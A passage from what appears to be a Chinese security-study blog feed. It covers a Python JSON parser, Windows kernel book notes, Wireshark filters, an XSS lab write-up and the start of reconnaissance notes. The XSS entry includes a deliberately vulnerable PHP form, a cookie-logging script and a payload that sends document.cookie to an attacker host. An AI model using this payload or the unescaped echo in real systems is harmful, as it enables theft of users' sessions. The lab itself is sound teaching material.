token_type == STRING_TOKEN:</span><br><span class="line">                <span class="comment"># print(&quot;array-------------array&quot;)</span></span><br><span class="line">                array.append(token_value)</span><br><span class="line">                expected = COMMA_TOKEN | END_ARRAY</span><br><span class="line">            <span class="keyword">elif</span> token_type == BOOL_TOKEN:</span><br><span class="line">                token_value = token_value.lower().capitalize()</span><br><span class="line">                array.append(&#123;<span class="string">&#x27;True&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;False&#x27;</span>: <span class="literal">False</span>&#125;[token_value])</span><br><span class="line">                expected = COMMA_TOKEN | END_ARRAY</span><br><span class="line">            <span class="keyword">elif</span> COMMA_TOKEN:</span><br><span class="line">                expected = BEGIN_ARRAY | BEGIN_OBJECT | STRING_TOKEN | BOOL_TOKEN | NULL_TOKEN | NUMBER_TOKEN</span><br><span class="line">            <span class="keyword">elif</span> END_JSON:</span><br><span class="line">                <span class="keyword">return</span> array</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">&#x27;Unexpected Token at position %d&#x27;</span> % json_index)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_json_object</span>():</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        处理json对象</span></span><br><span class="line"><span class="string">        :return:处理json中的json对象</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">global</span> json_index</span><br><span class="line">        expected = STRING_TOKEN | END_OBJECT</span><br><span class="line">        key = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> json_index != <span class="built_in">len</span>(tokenlist):</span><br><span class="line">            json_index += <span class="number">1</span></span><br><span class="line">            token = tokenlist[json_index]</span><br><span class="line">            token_type = token[<span class="number">0</span>]</span><br><span class="line">            token_value = token[<span class="number">1</span>]</span><br><span class="line">            <span class="comment"># print(&quot;expected: &quot;, expected, &quot;token_type: &quot;, token_type, &quot;token_value: &quot;, token_value)</span></span><br><span class="line">            check_token(expected, token_type)</span><br><span class="line">            <span class="keyword">if</span> token_type == BEGIN_OBJECT:</span><br><span class="line">                obj.update(&#123;key: parse_json_object()&#125;)</span><br><span class="line">                expected = COMMA_TOKEN | END_OBJECT</span><br><span class="line">            <span class="keyword">elif</span> token_type == END_OBJECT:</span><br><span class="line">                <span class="keyword">return</span> obj</span><br><span class="line">            <span class="keyword">elif</span> token_type == BEGIN_ARRAY:</span><br><span class="line">                <span class="comment"># print(&quot;join array&quot;)</span></span><br><span class="line">                obj.update(&#123;key: parse_json_array()&#125;)</span><br><span class="line">                expected = COMMA_TOKEN | END_OBJECT | STRING_TOKEN</span><br><span class="line">            <span class="keyword">elif</span> token_type == NULL_TOKEN:</span><br><span class="line">                obj.update(&#123;key: <span class="literal">None</span>&#125;)</span><br><span class="line">                expected = COMMA_TOKEN | END_OBJECT</span><br><span class="line">            <span class="keyword">elif</span> token_type == STRING_TOKEN:</span><br><span class="line">                pre_token = tokenlist[json_index - <span class="number">1</span>]</span><br><span class="line">                pre_token_value = pre_token[<span class="number">0</span>]</span><br><span class="line">                <span class="comment"># print(pre_token_value)</span></span><br><span class="line">                <span class="keyword">if</span> pre_token_value == COLON_TOKEN:</span><br><span class="line">                    value = token[<span class="number">1</span>]</span><br><span class="line">                    obj.update(&#123;key: value&#125;)</span><br><span class="line">                    <span class="comment">#      print(&quot;----------&quot;)</span></span><br><span class="line">                    expected = COMMA_TOKEN | END_OBJECT</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    key = token[<span class="number">1</span>]</span><br><span class="line">                    expected = COLON_TOKEN</span><br><span class="line">            <span class="comment">#     print(&quot;+++++++++&quot;)</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> token_type == NUMBER_TOKEN:</span><br><span class="line">                obj.update(&#123;key: <span class="built_in">int</span>(token_value)&#125;)</span><br><span class="line">                expected = COMMA_TOKEN | END_OBJECT</span><br><span class="line">            <span class="keyword">elif</span> token_type == BOOL_TOKEN:</span><br><span class="line">                token_value = token_value.lower().capitalize()</span><br><span class="line">                obj.update(&#123;key: &#123;<span class="string">&#x27;True&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;False&#x27;</span>: <span class="literal">False</span>&#125;[token_value]&#125;)</span><br><span class="line">                expected = COMMA_TOKEN | END_OBJECT</span><br><span class="line">            <span class="keyword">elif</span> token_type == COLON_TOKEN:</span><br><span class="line">                expected = NULL_TOKEN | NUMBER_TOKEN | BOOL_TOKEN | STRING_TOKEN | BEGIN_ARRAY | BEGIN_OBJECT</span><br><span class="line">            <span class="keyword">elif</span> token_type == COMMA_TOKEN:</span><br><span class="line">                expected = STRING_TOKEN</span><br><span class="line">            <span class="keyword">elif</span> token_type == END_JSON:</span><br><span class="line">                <span class="keyword">return</span> obj</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">&#x27;Unexpected Token at position %d&#x27;</span> % json_index)</span><br><span class="line"></span><br><span class="line">    array = []</span><br><span class="line">    obj = &#123;&#125;</span><br><span class="line">    <span class="keyword">global</span> json_index</span><br><span class="line">    <span class="keyword">if</span> tokenlist[<span class="number">0</span>][<span class="number">0</span>] == BEGIN_OBJECT:</span><br><span class="line">        <span class="keyword">return</span> parse_json_object()</span><br><span class="line">    <span class="keyword">elif</span> tokenlist[<span class="number">0</span>][<span class="number">0</span>] == BEGIN_ARRAY:</span><br><span class="line">        <span class="keyword">return</span> parse_json_array()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Illegal Token at position %d&#x27;</span> % json_index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    raw_data = <span class="built_in">input</span>()</span><br><span class="line">    jlist = tokenizer(raw_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        jdict = parse_json(jlist)</span><br><span class="line">        <span class="built_in">print</span>(jdict)</span><br><span class="line">    <span class="keyword">except</span> BaseException <span class="keyword">as</span> result:</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>具体解析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JSON 解析器从本质上来说就是根据 JSON 文法规则创建的状态机，输入是一个 JSON 字符串，输出是一个包含JSON各个部分的字典。一般来说，解析过程包括词法分析和语法分析两个阶段。词法分析阶段的目标是按照构词规则将 JSON 字符串解析成 Token 流，举个例子：</span><br><span class="line"></span><br><span class="line">比如有如下的 JSON 字符串：&#123;&quot;name&quot;:&quot;小明&quot;,&quot;age&quot;:14&#125;</span><br><span class="line">生成Token流为：</span><br><span class="line">[(1, &#x27;&#123;&#x27;)，(64, &#x27;name&#x27;)，(256, &#x27;:&#x27;)，(64, &#x27;小明&#x27;)，(512, &#x27;,&#x27;)，(64, &#x27;age&#x27;)，(256, &#x27;:&#x27;)，(32, 14)，(4, &#x27;&#125;&#x27;)，(65536, None)]</span><br><span class="line">可以看出字符串中的每一个部分，都用一个数字进行表示，其中这些数字分别代表不同含义，用来标识JSON字符串中不同的部分，例如：(1, &#x27;&#123;&#x27;)中‘1’表示JSON对象开始的部分，在程序中用BEGIN_OBJECT代表。</span><br><span class="line"></span><br><span class="line">通过词法分析阶段得到Token 流后，需要对Token 流进行语法分析。语法分析的目的是根据 JSON 文法检查上面 Token 序列所构成的 JSON 结构是否合法。比如 JSON 文法要求非空 JSON 对象以键值对的形式出现，不能是一些非法形式。比如：‘&#123;&quot;name&quot;:&quot;小明&quot;,&quot;age&quot;:14,’，（由于大括号没有封闭，所以结构非法）。这时候我们采用递归下降的方法逐一处理每一个Token，判断他们的结构是否合法，并组成字典结构。</span><br><span class="line"></span><br><span class="line">上文的TOKEN流最终成为如下的字典结构：</span><br><span class="line">&#123;&#x27;name&#x27;: &#x27;小明&#x27;, &#x27;age&#x27;: 14&#125;</span><br><span class="line"></span><br><span class="line">注意：输入的是JSON字符串，类型为str，输出为字典结构，类型为dict，看起来很像但并不一样</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：<br>输入的是一个字符串，而<strong>不是字典</strong>。我们要做的就是将这个字符串转换为对于的python格式。</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ol>
<li>写入文件</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806748.png"></p>
<ol start="2">
<li>读入文件</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806749.png"></p>
<ol start="3">
<li>文件指针：</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806789.png"></p>
<ol start="4">
<li>os模块</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806804.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806826.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648542806844.png"></p>
]]></content>
      <categories>
        <category>【-基础知识-】编程语言学习</category>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>前言、目录与准备</title>
    <url>/2023/11/03/win%E5%86%85%E6%A0%B8%E5%8E%9F%E7%90%86-%E5%86%99%E5%9C%A8%E6%9C%80%E5%89%8D%E9%9D%A2/</url>
    <content><![CDATA[<blockquote>
<p><strong>写在最前面</strong>：书籍为<code>《Windows内核原理与实现》</code>，本章非正式内容，为前言、目录解读，后续工作梳理。</p>
</blockquote>
<p><strong>书之前言：</strong></p>
<p>本书适合于已经有了<strong>操作系统基本概念</strong>的读者进一步理解 Windows 操作系统。通过学习本书的内容， 读者不仅可以掌握 <strong>Windows 的核心机制</strong>，也可以理解像 Windows 这样的现代操作系统是<strong>如何构建</strong>起来的。</p>
<p><strong>本书定位：</strong></p>
<p>一本按照操作系统基本概念和理论来阐释 Windows 实现机理的书籍。</p>
<p><strong>对读者：</strong></p>
<p>本书中描述的大多数细节是以 <code>WRK（Windows Research Kernel）</code>的代码为基础，但是，对于各种核心机制的介绍却是通用的，并不限于 WRK 内核，甚至适用于 各种版本的 Windows。</p>
<blockquote>
<p>WRK的全称是“Windows Research Kernel”，它是微软为高校操作系统课程提供的<strong>可修改和跟踪的操作系统教学平台</strong>。它给出了Windows这个成功的商业操作系统的内核大部分代码，可以对其进行修改、编译，并且可以用这个内核启动Windows操作系统。可让学生将操作系统基本原理和商业<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8/297824?fromModule=lemma_inlink">操作系统内核</a>联系起来，进一步加深对操作系统整体的理解。</p>
</blockquote>
<p><strong>如何去读：</strong></p>
<ul>
<li>配合 <code>WRK 代码</code>来阅读本书是最理想的阅读方式；</li>
<li>善用 <code>windbg</code>，并设置 Microsoft 提供的公共符号服务（参考本书附录 A），则可以在内核调试环境中查看到很多实现细节</li>
</ul>
<p><strong>前置知识：</strong></p>
<ul>
<li>操作系统的基本知识</li>
<li>较为熟练的编程能力</li>
<li>硬件系统结构、汇编语言和编译原理等</li>
</ul>
<p><strong>内容组织</strong>：</p>
<ul>
<li>从现代操作系统的概念模型出发，重点讨论了<strong>进程、线程和内存管理的基本概念</strong>以及在 <strong>Windows 中的实现细节</strong>，也讨论了 Windows 中的<strong>并发性和同步处理机制</strong>。</li>
<li>还讲述了 Windows 的<strong>存储体系结构</strong>，它把 Windows 系统中众多的内核组件，包括缓存管理器、文件系统、磁盘管理驱动 程序等，纳入到了一个统一的框架中。</li>
<li><strong>内核中</strong>的对象管理、配置管理（即注 册表服务）、系统内核日志、安全性管理、系统服务分发、LPC（Local Procedure Call， 本地过程调用），以及网络和 Windows 子系统等</li>
</ul>
<p><strong>注</strong>：本书讨论的内容 以 <code>Windows Server 2003 SP1</code> 为基准系统，但同样适用于客户端操作系统</p>
<p><strong>内容概述</strong>：9正文+2附录</p>
<ul>
<li><p>第 1 章介绍了操作系统的基础概念、Windows 操作系统的发展历史、Windows 内核 的发展，以及学习操作系统的一些前提知识，最后还介绍了操作系统的研究进展</p>
<p>歌曰：可以简单过一下，当看故事了</p>
</li>
<li><p>第 2 章从总体上介绍了 Windows 操作系统</p>
<ul>
<li>现代操作系统的基本模型</li>
<li>Windows 的总体结构与有关 WRK 和相应源代码 的一些说明</li>
<li>内核中的 一些基本概念</li>
<li>Windows 内核中的公共管理设施</li>
<li>Windows 引导过程，包括内核初始化和用户会话建立过程</li>
</ul>
<p>歌曰：通过这一节建立整本书的知识框架</p>
</li>
<li><p>第 3 章： Windows 中的进程和线程管理</p>
</li>
<li><p>第 4 章： Windows 中的内存管理</p>
</li>
<li><p>第 5 章： Windows 中的并发和同步机制</p>
</li>
<li><p>第 6 章： Windows 的 I&#x2F;O 模型</p>
</li>
<li><p>第 7 章： Windows 的存储管理</p>
</li>
<li><p>第 8 章： Windows 的系统服务</p>
</li>
<li><p>第9章：Windows 中的网络结构、Windows 子系统， 以及Windows的内核日志</p>
</li>
</ul>
<p><strong>先要做的</strong>：</p>
<p>学习编译 WRK，以及在虚拟机环境中运行 和调试 WRK</p>
<p><strong>工具准备</strong>：</p>
<ul>
<li><code>ProcMon</code>：<strong>进程和线程监视工具</strong>。它可以实时地显示当前每个处理器正在执行哪些进程和线程。这些信息还可以被转储到一个文本文件中供进一步分析和查看。 </li>
<li><code>MemMon</code>：<strong>内存监视工具</strong>。它可以显示当前系统内存空间和每一个进程的用户空间的内存布局。在进程内存空间，MemMon 能够显示进程中的模块、堆、栈等信息。</li>
<li><code>DPerfLite</code>：一个可以<strong>揭示线程间同步关系</strong>的工具。它记录了当前系统中与同步有关的内核操作，允许用户在一个图形界面中直观地观察这些操作，并检查线程之间的各种同步关系。</li>
<li><code>IRPMon</code>：IRP 完成情况的监视工具。它在内核中记录下<strong>每一个 I&#x2F;O 请求的完成操作</strong>， 然后由 IRPMon 用户模式程序定期地从内核中获取这些记录，并显示在一个列表窗口中，供用户查看。 </li>
<li><code>SdtViewer</code>，SDT（服务描述符表）显示工具。此工具可以<strong>显示出当前系统中的 SDT</strong>； 如果有符号信息支持，它也能够显示 Windows 子系统的 SDT。</li>
</ul>
<blockquote>
<p><strong>写在最后</strong>：操作系统是基础能力，无论什么专业都很重要，在安全领域也是如此。比如恶意代码通过Rootkit隐藏痕迹、漏洞研究中的系统漏洞、内核漏洞等。希望通过本书完成第一步，后续会在具体的实践中提高。</p>
</blockquote>
]]></content>
      <categories>
        <category>【-基础知识-】Windows内核学习</category>
        <category>Windows内核原理与实现</category>
      </categories>
      <tags>
        <tag>内核</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>wirshark的过滤规则</title>
    <url>/2023/10/01/wirshark%E7%9A%84%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/</url>
    <content><![CDATA[<blockquote>
<p>ps：这篇文章旨在记录常用规则，为网上搜集。</p>
</blockquote>
<h1 id="wirshark的过滤"><a href="#wirshark的过滤" class="headerlink" title="wirshark的过滤"></a>wirshark的过滤</h1><p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095243818.png" alt="image-20231109095243818"></p>
<blockquote>
<p>在Filter编辑框中，收入过虑规则时，如果语法有误，框会显红色，如正确，会是绿色</p>
</blockquote>
<h1 id="过滤源ip、目的ip"><a href="#过滤源ip、目的ip" class="headerlink" title="过滤源ip、目的ip"></a>过滤源ip、目的ip</h1><ul>
<li>查找目的地址为192.168.101.8的包，<code>ip.dst==192.168.101.8；</code></li>
<li>查找源地址为192.168.43.199 的包，<code> ip.src==192.168.43.199.</code></li>
</ul>
<h1 id="端口过滤"><a href="#端口过滤" class="headerlink" title="端口过滤"></a>端口过滤</h1><ul>
<li>过滤80端口，在Filter中输入，<code>tcp.port==80</code>，这条规则是把源端口和目的端口为80的都过滤出来。</li>
<li><code>tcp.dstport==80</code>只过滤目的端口为80的，</li>
<li><code>tcp.srcport==80</code>只过滤源端口为80的包</li>
<li>过滤端口范围 ：<code>tcp.port &gt;= 1 and tcp.port &lt;= 80</code></li>
</ul>
<blockquote>
<p>前面的为协议类型，如tcp、udp等</p>
</blockquote>
<h1 id="协议过滤"><a href="#协议过滤" class="headerlink" title="协议过滤"></a>协议过滤</h1><p>比较简单，直接在Filter框中直接输入协议名即可，如过滤HTTP的协议,输入HTTP即可。<br>tcp、udp、arp、icmp、http、smtp、ftp、dns、msnms、ip、ssl、oicq、bootp</p>
<blockquote>
<p>排除arp包，如!arp   或者   not arp<br>DHCP协议的检索规则不是dhcp&#x2F;DHCP， 而是bootp</p>
</blockquote>
<h1 id="http模式过滤"><a href="#http模式过滤" class="headerlink" title="http模式过滤"></a>http模式过滤</h1><ul>
<li>过滤get包，<code>http.request.method==&quot;GET&quot;</code></li>
<li>过滤post包，<code>http.request.method==&quot;POST&quot;</code></li>
</ul>
<h1 id="过滤MAC"><a href="#过滤MAC" class="headerlink" title="过滤MAC"></a>过滤MAC</h1><p><strong>太以网头过滤</strong></p>
<ul>
<li><code>eth.dst == A0:00:00:04:C5:84</code> &#x2F;&#x2F; 过滤目标mac</li>
<li><code>eth.src eq A0:00:00:04:C5:84</code> &#x2F;&#x2F; 过滤来源mac</li>
<li><code>eth.addr eq A0:00:00:04:C5:84</code>&#x2F;&#x2F; 过滤来源MAC和目标MAC都等于A0:00:00:04:C5:84的</li>
</ul>
<h1 id="TCP参数过滤"><a href="#TCP参数过滤" class="headerlink" title="TCP参数过滤"></a>TCP参数过滤</h1><ul>
<li><code>tcp.flags</code> 显示包含TCP标志的封包。</li>
<li><code>tcp.flags.syn == 0x02</code>     显示包含TCP SYN标志的封包。</li>
<li><code>tcp.window_size == 0 &amp;&amp; tcp.flags.reset != 1</code></li>
</ul>
<h1 id="特殊符号的使用"><a href="#特殊符号的使用" class="headerlink" title="特殊符号的使用"></a>特殊符号的使用</h1><ul>
<li>过滤两种条件时，使用and连接，如过滤ip为192.168.101.8并且为http协议的，<code>ip.src==192.168.101.8 and http</code></li>
<li>过滤两种条件时，使用or连接，如过滤ip为192.168.101.8或者http协议的，<code>ip.src==192.168.101.8 or http</code></li>
<li>less than 小于 &lt; lt </li>
<li>小于等于 le</li>
<li>等于 eq</li>
<li>大于 gt</li>
<li>大于等于 ge</li>
<li>不等 ne</li>
</ul>
<blockquote>
<p>最后，补充一下好的网址：<a href="https://blog.csdn.net/wojiaopanpan/article/details/69944970">https://blog.csdn.net/wojiaopanpan/article/details/69944970</a></p>
</blockquote>
]]></content>
      <categories>
        <category>【-专业知识-】恶意代码分析与处置</category>
        <category>工具整理</category>
      </categories>
      <tags>
        <tag>恶意代码分析</tag>
      </tags>
  </entry>
  <entry>
    <title>xss攻击测试</title>
    <url>/2023/03/29/xss%E5%B0%8F%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<h1 id="概念辨析"><a href="#概念辨析" class="headerlink" title="概念辨析"></a>概念辨析</h1><h2 id="cookie？"><a href="#cookie？" class="headerlink" title="cookie？"></a>cookie？</h2><blockquote>
<p>什么是cookie?其工作机制是什么？</p>
</blockquote>
<h4 id="什么是cookie"><a href="#什么是cookie" class="headerlink" title="什么是cookie?"></a>什么是cookie?</h4><p>在了解cookie之前，我们必须明确一个概念：即<code>HTTP协议本身是无状态</code>的，无状态是指Web浏览器与Web服务器之间不需要建立持久的连接，这意味着当一个客户端向服务器端发出请求，然后Web服务器返回响应（Response），连接就被关闭了，在服务器端不保留连接的有关信息。也就是说，HTTP请求只能由客户端发起，而服务器不能主动向客户端发送数据。<br>而<code>cookie就是这个身份的证明</code>，实际上是一小段的文本信息（key-value格式）。<br>客户端向服务器发起请求，如果服务器需要记录该用户状态，就使用response向客户端浏览器颁发一个Cookie。客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。服务器检查该Cookie，以此来辨认用户状态。</p>
<h4 id="cookie的工作机制？"><a href="#cookie的工作机制？" class="headerlink" title="cookie的工作机制？"></a>cookie的工作机制？</h4><blockquote>
<p>当用户第一次访问并登陆一个网站的时候，cookie的设置以及发送会经历4个步骤：</p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095310609.png" alt="image-20231109095310609"></p>
<h2 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h2><h4 id="什么是xss攻击？"><a href="#什么是xss攻击？" class="headerlink" title="什么是xss攻击？"></a>什么是xss攻击？</h4><blockquote>
<p>Cross Site Scripting  ,跨站脚本攻击。</p>
<blockquote>
<p>人们经常将跨站脚本攻击（Cross Site Scripting）缩写为CSS，但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，有人将跨站脚本攻击缩写为XSS。</p>
</blockquote>
</blockquote>
<p>跨站脚本攻击（XSS），是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者<code>嵌入恶意脚本代码</code>到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。</p>
<p>XSS漏洞可以追溯到上世纪90年代。大量的网站曾遭受XSS漏洞攻击或被发现此类漏洞，如Twitter、Facebook、MySpace、Orkut、新浪微博和百度贴吧。研究表明，最近几年XSS已经超过缓冲区溢出成为最流行的攻击方式，有68%的网站可能遭受此类攻击。根据开放网页应用安全计划（Open Web Application Security Project）公布的2021年统计数据，在Web安全威胁前10位中，XSS并入代码注入（Injection），而注入威胁排在top10的第三位。</p>
<h4 id="xss攻击的目的"><a href="#xss攻击的目的" class="headerlink" title="xss攻击的目的"></a>xss攻击的目的</h4><p>常用的XSS攻击手段和目的有：</p>
<ol>
<li>盗用cookie，获取敏感信息。</li>
<li>利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。</li>
<li>利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</li>
<li>利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li>
<li>在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。</li>
</ol>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p> <code>Website</code>：有XXS漏洞的合法网站,这里使用Kali-Linux2虚拟机作为网站服务器<br> <code>Website Visitor</code>：受害访问者，这里使用win10物理机进行代替<br> <code>Perptrator</code>：攻击者及数据接收网站。说明：将合法网站和攻击者接收网站都放在Kali虚拟机</p>
<h2 id="使用脚本"><a href="#使用脚本" class="headerlink" title="使用脚本"></a>使用脚本</h2><blockquote>
<p>对于website,使用submit.php</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;XSS Demo&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">    &lt;input style=<span class="string">&quot;width:300px;&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;address1&quot;</span> value=<span class="string">&quot;&lt;?php echo <span class="subst">$_GET</span>[&quot;</span>address1<span class="string">&quot;]; ?&gt;&quot;</span> /&gt;</span><br><span class="line">            &lt;input type=“submit” value=“submit<span class="string">&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>对于Perptrator，使用hack.php</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$victim</span> = ‘XXS get the cookie:<span class="string">&#x27;. $_SERVER[&#x27;</span>REMOTE_ADDR<span class="string">&#x27;]. &#x27;</span>:<span class="string">&#x27; .$_GET[&#x27;</span>cookie<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">file_put_contents(‘1.txt&#x27;</span>, <span class="variable">$victim</span>);</span><br><span class="line"><span class="keyword">echo</span> welcome；</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>恶意payload:</p>
</blockquote>
<p><code>&quot;/&gt; &lt;script&gt;window.open(&quot;http://192.168.2.123/hack.php?cookie=&quot;+document.cookie);&lt;/script&gt;&lt;!-- </code></p>
<h1 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h1><p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095330881.png" alt="image-20231109095330881"><br>这里把红蓝方合并，即既使用此虚拟机作为xss漏洞网站，有作为接收网站。</p>
<h3 id="第一步-脚本部署"><a href="#第一步-脚本部署" class="headerlink" title="第一步 脚本部署"></a>第一步 脚本部署</h3><blockquote>
<p>在虚拟机 &#x2F;var&#x2F;www&#x2F;html&#x2F;处进行部署，这里是apache服务的默认地址<br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095346309.png" alt="image-20231109095346309"></p>
</blockquote>
<h3 id="第二步-IP地址查询"><a href="#第二步-IP地址查询" class="headerlink" title="第二步 IP地址查询"></a>第二步 IP地址查询</h3><blockquote>
<p>Kali使用ifconfig，win10 使用ipconfig进行查询。可知二者在一个子网。<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591494380.png" alt="Kali ip"><br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095401520.png" alt="image-20231109095401520"></p>
</blockquote>
<h3 id="第三步-漏洞利用"><a href="#第三步-漏洞利用" class="headerlink" title="第三步 漏洞利用"></a>第三步 漏洞利用</h3><blockquote>
<p>在Kali里进行网站的访问与恶意payload的输入</p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095415939.png" alt="image-20231109095415939"></p>
<h3 id="第四步-漏洞验证"><a href="#第四步-漏洞验证" class="headerlink" title="第四步 漏洞验证"></a>第四步 漏洞验证</h3><blockquote>
<p>在win10 物理机进行访问，查看结果</p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095438833.png" alt="image-20231109095438833"></p>
<h1 id="实验收获"><a href="#实验收获" class="headerlink" title="实验收获"></a>实验收获</h1><ol>
<li>了解了cookie的概念与原理</li>
<li>知道了xss攻击的一些基本知识</li>
<li>实际演示了一次xss攻击的流程，对漏洞存在者、漏洞利用者、受害者的关系有了清晰的理解。</li>
</ol>
]]></content>
      <categories>
        <category>【-专业知识-】渗透测试</category>
        <category>课程记录</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>主动与被动扫描</title>
    <url>/2023/03/29/%E4%B8%BB%E5%8A%A8%E4%B8%8E%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><blockquote>
<p>信息收集对于渗透测试来说是很重要的，是渗透测试的前期准备工作，俗话说知己知彼，才能百战不殆。掌握了对目标的足够信息，我们才能更好地开展渗透测试。</p>
</blockquote>
<h1 id="信息收集的分类"><a href="#信息收集的分类" class="headerlink" title="信息收集的分类"></a>信息收集的分类</h1><blockquote>
<p>信息收集的根据方式的不同大概分为两个类别：主动扫描与被动扫描</p>
</blockquote>
<h2 id="被动扫描"><a href="#被动扫描" class="headerlink" title="被动扫描"></a>被动扫描</h2><blockquote>
<p>被动信息收集是指通过各种在线网站等第三方服务对网站进行信息收集。通过用<code>Google Hacking</code>，<code>shodan</code>，<code>fofa</code>等搜索引擎对目标进行信息探测，虽然获得的信息可能不多，但是不存在被目标发现的可能。</p>
</blockquote>
<p><em><strong>收集的信息？</strong></em></p>
<ul>
<li>目标网站所有者的信息：姓名、地址、电话、电子邮件等</li>
<li>目标网站相关的电子邮箱。</li>
<li>目标网站用户的社交信息：网站工作人员的微博、QQ、论坛发帖…</li>
</ul>
<p><em><strong>被动扫描的常用方法？</strong></em></p>
<ul>
<li>俄罗斯搜索引擎-图片搜索（<a href="https://www.yandex.com/">https://www.yandex.com/</a>）</li>
<li>图片信息 metadata （如<a href="http://www.toolzl.com/tools/getGpsArea.html">经纬度查看</a>等）</li>
<li>Maltego的使用（开源情报收集和取证）</li>
<li>利用Recon-NG进行信息收集</li>
